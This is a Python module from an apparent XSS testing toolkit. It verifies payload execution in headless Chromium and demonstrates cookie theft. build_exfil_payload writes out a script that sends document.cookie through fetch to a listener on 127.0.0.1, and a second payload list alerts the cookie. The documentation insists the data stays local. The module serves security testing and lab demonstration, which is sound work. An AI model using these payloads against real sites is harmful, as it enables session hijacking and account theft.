"""
Headless-browser XSS verification and demonstration.

Uses Playwright/Chromium to prove that a reflected payload actually
executes. Includes a demonstration mode that reads document.cookie and
sends it to a LOCAL listener owned by this process — the cookie never
leaves the machine running the toolkit. The listener is torn down when
the demonstration finishes.
"""

import asyncio
import secrets

try:
    from playwright.async_api import async_playwright
    _HAS_PLAYWRIGHT = True
except ImportError:
    _HAS_PLAYWRIGHT = False

from aiohttp import web

from core.output import info, warn, success


# ---------------------------------------------------------------------
# Execution verification
# ---------------------------------------------------------------------

async def verify_execution(url, timeout=8.0, verbose=False):
    """Load url in headless Chromium. Return:
        {"executed": bool, "dialog_text": str, "console": [str],
         "error": str | None}
    """
    if not _HAS_PLAYWRIGHT:
        return {"executed": False, "dialog_text": "", "console": [],
                "error": "playwright not installed"}

    result = {"executed": False, "dialog_text": "", "console": [],
              "error": None}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        ctx = await browser.new_context()
        page = await ctx.new_page()

        page.on("console", lambda m: result["console"].append(m.text))

        async def on_dialog(d):
            result["executed"] = True
            result["dialog_text"] = d.message
            try:
                await d.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)

        try:
            await page.goto(url, wait_until="load",
                            timeout=timeout * 1000)
            # Give late-firing JS a moment.
            await asyncio.sleep(0.6)
        except Exception as e:
            result["error"] = f"{type(e).__name__}: {e}"

        await browser.close()

    if verbose and result["executed"]:
        info(f"browser: payload executed, dialog={result['dialog_text']!r}")

    return result


# ---------------------------------------------------------------------
# Local listener (for the demonstration exfiltration)
# ---------------------------------------------------------------------

class LocalListener:
    """HTTP listener on 127.0.0.1 that records incoming GET requests.

    Nothing outside the local machine can reach this. It exists only to
    demonstrate that an XSS payload can read document.cookie and transmit
    the value somewhere.
    """

    def __init__(self):
        self.port = None
        self.hits = []          # list of (path, query_string)
        self._runner = None
        self._ready = asyncio.Event()

    async def _handler(self, request):
        self.hits.append((request.path, request.query_string))
        return web.Response(status=204)

    async def start(self):
        app = web.Application()
        app.router.add_route("*", "/{tail:.*}", self._handler)
        self._runner = web.AppRunner(app)
        await self._runner.setup()
        site = web.TCPSite(self._runner, "127.0.0.1", 0)
        await site.start()
        # Discover the OS-assigned port
        for sock in site._server.sockets:
            self.port = sock.getsockname()[1]
            break
        self._ready.set()
        return self.port

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()
            self._runner = None


# ---------------------------------------------------------------------
# Demonstration: cookie exfiltration to the local listener
# ---------------------------------------------------------------------

def build_exfil_payload(port):
    """Payload that reads document.cookie and sends it to the listener
    running on 127.0.0.1:<port>. No external destination. Hardcoded so
    that this toolkit cannot be repurposed against a third-party host
    without editing the source."""
    return (
        f"<script>fetch('http://127.0.0.1:{port}/?c='"
        f"+encodeURIComponent(document.cookie))</script>"
    )


async def verify_cookie_exfil(url, timeout=8.0, verbose=False):
    """Load url in headless Chromium. The URL is expected to contain the
    exfil payload already. Return the cookie value received by the local
    listener, or None if nothing arrived."""
    if not _HAS_PLAYWRIGHT:
        return None, "playwright not installed"

    listener = LocalListener()
    port = await listener.start()
    if verbose:
        info(f"local listener started on 127.0.0.1:{port}")

    try:
        # NOTE: the payload must already be in `url`. The caller is
        # responsible for injecting build_exfil_payload(port) into the
        # vulnerable parameter.
        result = await verify_execution(url, timeout=timeout, verbose=verbose)

        # Wait up to `timeout` seconds for the listener to receive a hit.
        for _ in range(int(timeout * 10)):
            if listener.hits:
                break
            await asyncio.sleep(0.1)
    finally:
        await listener.stop()

    if not listener.hits:
        return None, "listener received no requests"

    path, query = listener.hits[0]
    # query looks like: c=PHPSESSID%3Dabc%3Bsecurity%3Dlow
    cookie_value = ""
    for kv in query.split("&"):
        if kv.startswith("c="):
            import urllib.parse as _up
            cookie_value = _up.unquote(kv[2:])
            break

    return cookie_value, None


# ---------------------------------------------------------------------
# Demonstration: DOM-display variants (no network at all)
# ---------------------------------------------------------------------

DOM_DISPLAY_PAYLOADS = [
    "<script>alert('cookie: ' + document.cookie)</script>",
    ("<script>"
     "document.body.setAttribute('data-xss-cookie', document.cookie);"
     "alert('XSS: ' + document.cookie);"
     "</script>"),
]


async def verify_dom_display(url, timeout=8.0, verbose=False):
    """Load url. Return the alert text (which should contain the cookie)."""
    r = await verify_execution(url, timeout=timeout, verbose=verbose)
    return r.get("dialog_text", ""), r.get("error")